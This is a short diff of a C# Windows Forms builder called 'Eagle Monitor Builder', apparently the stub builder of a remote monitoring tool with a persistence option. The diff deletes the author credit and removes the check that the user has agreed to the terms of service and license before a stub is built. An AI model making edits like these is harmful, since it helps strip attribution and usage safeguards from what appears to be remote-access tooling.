@@ -5,10 +5,6 @@ using System.Diagnostics;
 using System.Drawing;
 using System.Windows.Forms;
 
-/*
-|| AUTHOR Arsium ||
-|| github : https://github.com/arsium       ||
-*/
 
 namespace Eagle_Monitor_Builder
 {
@@ -98,8 +94,7 @@ namespace Eagle_Monitor_Builder
 
         private void buildGuna2Button_Click(object sender, EventArgs e)
         {
-            if (tosLicenseGuna2CheckBox.Checked)
-            {
+
                 Helpers builder = new Helpers();
 
                 string finalStubPath = Helpers.Utils.stubPath;
@@ -129,11 +124,8 @@ namespace Eagle_Monitor_Builder
                     },
                     iconPath
                     );
-            }
-            else 
-            {
-                MessageBox.Show("You forgot to agree with TOS and license !");
-            }
+            
+
         }
 
         private void persistenceSoundGuna2CheckBox_CheckedChanged(object sender, EventArgs e)
